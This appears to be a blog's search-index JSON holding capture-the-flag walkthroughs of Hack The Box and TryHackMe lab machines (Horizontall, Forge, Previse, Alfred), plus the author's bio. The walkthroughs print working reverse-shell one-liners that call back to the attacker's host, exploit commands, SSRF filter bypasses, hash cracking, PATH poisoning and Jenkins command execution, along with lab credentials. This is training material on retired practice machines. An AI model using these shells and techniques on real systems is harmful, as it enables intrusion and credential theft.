/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.Horizontall.htb\" -u http://horizontall.htb/ -c -fc 301\r-fc : filter by code u don’t want results: www [Status: 200, Size: 901, Words: 43, Lines: 2] api-prod [Status: 200, Size: 413, Words: 76, Lines: 20]\radd api-prod to the /etc/hosts ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:0:2","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Foothold : ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Directory Busting : $ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://api-prod.horizontall.htb/FUZZ\rresults : Admin [Status: 200, Size: 854, Words: 98, Lines: 17] ADMIN [Status: 200, Size: 854, Words: 98, Lines: 17] admin [Status: 200, Size: 854, Words: 98, Lines: 17] favicon.ico [Status: 200, Size: 1150, Words: 4, Lines: 1] index.html [Status: 200, Size: 413, Words: 76, Lines: 20] reviews [Status: 200, Size: 507, Words: 21, Lines: 1] robots.txt [Status: 200, Size: 121, Words: 19, Lines: 4] users [Status: 403, Size: 60, Words: 1, Lines: 1]\rsearching for strapi exploit and found RCE exploit here as we see it is a blind RCE we can verify it is valid By pinging our host : so let’s get our reverse shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc \u003cmy_ip\u003e 9999 \u003e/tmp/f\r","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:1","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"stablize the shell : python -c \"import pty;pty.spawn('/bin/bash')\"\r","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:2","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"we are in ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:3","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Privilege escalation : after some manual enumeration i tried to see what are the ports running on this machine with ss -lpnut\rand found this : Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port\rtcp LISTEN 0 128 127.0.0.1:8000 0.0.0.0:*\ryou can also run LinEnum and reach the same conclusion this port wasn’t in the nmap scan so it isn’t publiclly exposed. to verify this is a path we can take to look for an escalation Factor i tried to see what is the service running at this port : and at the bottom of the output i found : Laravel v8 (PHP v7.4.18)\rsearching if it has an exploit and found many so we can now do port forwarding to see the web page at our browser and deal with it ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:2:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"port forwading we have many ways to achieve that i tried ssh remote port forwarding But it doesn’t work , so i used chisel download version on your side and upload same version on the victim side so what we are going to do here is port forward 8000 at this machine to 8000 at our machine and the traffic is through port 12312 commands : on server side (my side) : $./chisel_1.7.6_linux_amd64 server -p 12312 --reverse on victim side : $ ./chisel_1.7.6_linux_amd64 client \u003cmy_ip\u003e:12312 R:8000:127.0.0.1:8000 now as we said before this laravel version has exploits i used this one testing it : so let’s get a reverse shell Finally as root python3 exploit.py \"http://127.0.0.1:8000\" Monolog/RCE1 \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc \u003cmy_ip\u003e 8888 \u003e/tmp/f\"\rpwned on 5 september 2021 . ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:3:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"detailed writeup for retired machine Forge From Hackthebox ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:0:0","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"Scanning : basic scanning note : add \u003cip\u003e forge.htb to the /etc/hosts nmap -sV -A -T 4 10.10.11.111\routput : PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Gallery\rwe can run all ports scan in the Background Until we enumerate the ports we have But it won’t return any new . ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:1:0","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"Enumeration : port 21 : is Filtered trying to access it ftp \u003cip\u003e\rreturns ftp: connect: Connection timed out\rso it seems we can’t access it Publicly port 80 : “the web application” we have some images located at /static/images , knowing that from page source code . so probably image we upload won’t be rendered on this page and we have upload an image Function with 2 options either from your machine or form url testing from my machine to upload a .png file and see it also accepts any extension and assign a random name to it testing from url : firing up a python http server at my local machine then watch the request made we can see parameters sent are : url=http%3A%2F%2F\u003cmy_ip\u003e%3A8888%2Ftest.png\u0026remote=1\rand it made the request successfully : 10.10.11.111 - - [16/Jan/2022 17:31:20] \"GET /test.png HTTP/1.1\"\rwhat about internal address ? trying http://127.0.0.1 result : URL contains a blacklisted address!\rso it makes some filtering in case we try localhost address indicating maybe we are against SSRF . trying some Bypasses and those doesn’t return Blacklisted message http://127.1\rhttp://LOCALHOST\rtrying : file:///etc/passwd returns : Invalid protocol! Supported protocols: http, https\rso now we know the following : we have ftp running internally we have ssrf to access local things accepts http and https only , ftp is not supported ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:0","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"More Enumeration : Typically in HTB , another Vhost is a common scenario so trying to get Fuzzing it with ffuf ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million 5000.txt -u http://forge.htb/ -H \"Host: FUZZ.forge.htb\" -fc 302,404\routput: admin [Status: 200, Size: 27, Words: 4, Lines: 2]\radd admin.forge.htb to /etc/hosts trying to access it : so putting things together we will have one conclusion to continue from : forge.htb can make a valid request to admin.forge.htb , we can achieve that: Back to the upload from url vulnerable Function and trying http://admin.forge.htb returns the blacklist message , so forge.htb seems to Be blocked also. trying : http://admin.forge.HTB then downloading the page and see contents : so we have the following directories at the admin.forge.htb /announcements\r/upload\r/\rBack to the upload from url and requesting http://admin.forge.HTB/announcements\rdownloading the page to see the content we can see : so we have credentials : user:heightofsecurity123! i tried to ssh with those But it can’t access ssh with a public key so it seems we have to get the id_rsa somehow if we want to ssh into the machine. so depending on page /announcements we can use ftp:// with the upload page in this admin.forge.HTB . Foothold : http://admin.forge.HTB/upload?u=ftp://\rBut How could we access the ftp with a user:password from web url ? reading here we can use the following syntax : http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1\rdownloading the content : drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap\r-rw-r----- 1 0 1000 33 Jan 17 00:17 user.txt\rseems we are in the home directory of user user so let’s try read the id_rsa using the following url and download content : http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/.ssh/id_rsa\rchmod 600 id_rsa ssh -i id_rsa user@10.10.11.111\r","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:1","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"Privilege escalation : checking permissions : -rwxr-xr-x 1 root root 1447 May 31 2021 /opt/remote-manage.py\rreading and analyzing the script : first it sets a listener on a random port we can only access the port locally so we will get a second ssh session to interact with it . port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening on localhost:{port}') (clientsock, addr) = sock.accept()\r2- asks for a password and it should = secretadminpassword , then waits for option from 1-4 clientsock.send(b'Enter the secret passsword: ') if clientsock.recv(1024).strip().decode() != 'secretadminpassword': clientsock.send(b'Wrong password!\\n') else: clientsock.send(b'Welcome admin!\\n') while True: clientsock.send(b'\\nWhat do you wanna do: \\n') clientsock.send(b'[1] View processes\\n') clientsock.send(b'[2] View free memory\\n') clientsock.send(b'[3] View listening sockets\\n') clientsock.send(b'[4] Quit\\n') option = int(clientsock.recv(1024).strip())\r3- options we have : if option == 1: clientsock.send(subprocess.getoutput('ps aux').encode()) elif option == 2: clientsock.send(subprocess.getoutput('df').encode()) elif option == 3: clientsock.send(subprocess.getoutput('ss -lnt').encode()) elif option == 4: clientsock.send(b'Bye\\n') break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit()\rif we raise an error it will open a pdb debugger shell which we can abuse to have a reverse shell as root : the other ssh session to interact with the port listening : raised the error by typing id while it expects a number and get the pdb shell we can now get a reverse shell : (/assets/images/Forge/Pdb) import os (/assets/images/Forge/Pdb) os.system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc \u003cmy_ip\u003e 9999 \u003e/tmp/f\")\rgain root reverse shell : Pwned ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:2","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"investigation : we have at /var/www the following : html forge admin\rin the source code we can see : blacklist = [\"forge.htb\", \"127.0.0.1\", \"10.10.10.10\", \"::1\", \"localhost\", '0.0.0.0', '[0:0:0:0:0:0:0:0]']\rwhich is not enough Filtering to mitigate SSRF , we have Bypassed that By changing any letter at forge.htb to Uppercase ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:3","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"In this Writeup you will find walkthrough of the retired machine previse From Hackthebox export IP=10.10.11.104 scanning : ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:0:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"intial sudo nmap -sV -vv $IP -oN nmap/intial\rPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))\rvisiting the web page : tried some sqli but not worked ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:1:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"directory brute-force : $ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt\rfound : /accounts.php (Status: 302) [Size: 3994] [--\u003e login.php] /config.php (Status: 200) [Size: 0] /download.php (Status: 302) [Size: 0] [--\u003e login.php] /files.php (Status: 302) [Size: 4914] [--\u003e login.php]\ryou can use curl without enabling redirect and will notice the same thing immediately curl http://10.10.11.104/accounts.php -vvv\rBut i opened up my burpsuite and observe the requests and response for /accounts.php there is a redirect happen to /login.php again . i do intercept the redirect and found : hence i want to view and interact with this page , i changed the HTTP 302 redirect to HTTP 200 OK forward it : i made an account and then redirected me to /login.php again so i logged in successfully navigating through the tabs found : so i downloaded the backup and found : in config.php : \u003c?php function connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u003e after some navigating in the files : in /logs.php so we can see the exec function which most likely indicating RCE , and python is executing on a script and seems the script saves output in out.log . understanding the logic at my local machine : so we can inject any command like : delim=comma;INJECTION However it won’t be printed in logs.out so it is a Blind RCE . we can get a shell immediatley [+] from here python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.120\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\r# stablizie the shell $ python -c \"import pty;pty.spawn('/bin/bash')\"\rhence we are in the machine now so we can access local host and view data base :D mysql -h localhost -u root -p previse\rmysql\u003e SELECT table_name FROM information_schema.tables;\rso we need m4lware password only i guess :3 let’s get it and try crack the hash from here: https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401 we can see it is a md5crypt hash $ hashcat -m 500 -a 0 hashed_m4lware /usr/share/wordlists/rockyou.txt # 500 : md5crypt # 0 : straight attack mode # output : $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!\r","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:2:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"privilege escalation so let’s read the script : #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log \u003e /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u003e /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz\rso it simply makes a backup for the logs with gzip . we should focus on how to manipulate gzip . ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:3:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"PATH poisoning we can see here : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ we can use that so when we execute this as root “with sudo” gzip will refer to the /tmp in the path i don’t know why but the shell doesn’t return any result although i gained the root access so i make a reverse shell and it worked perfectly Pwned","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:3:1","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Windows Machines"],"content":"In this room, we’ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we’ll use an interesting privilege escalation method to get full system access. Scanning we can start with this scan providing the -Pn as it is a windows machine and may not respond ICMP nmap -Pn -A -T4 $IP -oN nmap.intial\rPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Site doesn't have a title (text/html). 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=alfred | Not valid before: 2022-07-03T14:01:24 |_Not valid after: 2023-01-02T14:01:24 |_ssl-date: 2022-07-04T14:03:22+00:00; 0s from scanner time. 8080/tcp open http Jetty 9.4.z-SNAPSHOT | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Jetty(9.4.z-SNAPSHOT) |_http-title: Site doesn't have a title (text/html;charset=utf-8). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\rwe have 2 web services running on ports 80 and 8080 respectively and the 3389 RDP port is open which can be used latter Enumeration i started visiting the web applications at ports 80 and 8080 . at port 8080 we can see it is a Jenkins service running and Jenkins is known for the ability to execute system commands . so we can focus on it for now and if we get stuck we can get back to the web application at port 80. Trying default credentials admin:admin we are in already ! we can now try to execute commands on the server. choose New Item from the left bar. choose any name then choose Freesytle Project then Ok under the Build we can choose what we want which is Execute windows batch command specify the command we want save it then choose build now when the build is done you will something like this click on it then choose the Console output From the left bar and we can execute commands indeed ! Foothold There are a lot of ways we can use to get a reverse connection back like powershell empire, metasploit frameworks or others. i will change the user password and RDP into then we can get reverse shells if we need. To change the command in the new item we made we need to select configure then replace the previous command with net user bruce secret123 to change the user password save the setting and choose build now , it should be changed . to trace if error occurred you can choose the Console outout as previous i will use Remmina rdp application on Linux to connect to it and we are in privilege escalation if we run net user bruce output is User name bruce Full Name Comment User's comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 7/4/2022 3:23:38 PM Password expires Never Password changeable 7/4/2022 3:23:38 PM Password required No User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 7/4/2022 3:26:17 PM Logon hours allowed All Local Group Memberships *Administrators Global Group memberships *None The command completed successfully.\rthe user bruce is in the administrators group . hence we have already rdp connection we can run as administrator the cmd.exe and we can now see the flag ","date":"2022-01-18","objectID":"/posts/windows-machines/2022-01-07-alfred/:0:0","tags":["Jekyll"],"title":"Alferd","uri":"/posts/windows-machines/2022-01-07-alfred/"},{"categories":null,"content":"Hello there , I am Hussein Misbah AKA 0xMesbaha a Cybersecurity Engineer @Cyshield Company with +4 years of experience in pentesting , CTFs and security in general. Currently interested in Applications Pentesting and Malware Development Offensive Security Web Expert (OSWE) Offensive Security certified professional (OSCP) Certified red team expert (CRTE) Certified red team professional (CRTP) EMAPT Certified EWPTX Certified Certified Azure red team professional (CARTP) CVE-2024-28347 ,CVE-2024-28348 (Remote Code Execution in well known 3rd party) CVE-2024-0986 (Command injection in PBX Voip product) CVE-2022-4340 idor in wordpress plugin BookingPress Pro hacker @Hackthebox Rasta labs , Zephyr labs HTB Code Review Badge pentesterlab CTF Player \u0026 Author in multiple international CTFs Ranked 3rd at EGCERT CTF 2025 Ranked 2nd at Arab Security war games Finals 2024 Ranked 1st at IwCon CTF 2023 Ranked 1st at Bsides albuquerqu CTF 2023 Ranked 3rd at Al-farahidi CTF 2023 Ranked 3rd at TCM CTF 2023 Ranked 3rd at Arab Security war games Finals 2023 Ranked 2nd at cyber talents Arab Reginal CTF 2023 Ranked 5th at Arab Security war games Finals 2022 Ranked 6th at cyber talents Egypt CTF 2021 ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"about","uri":"/about/"}]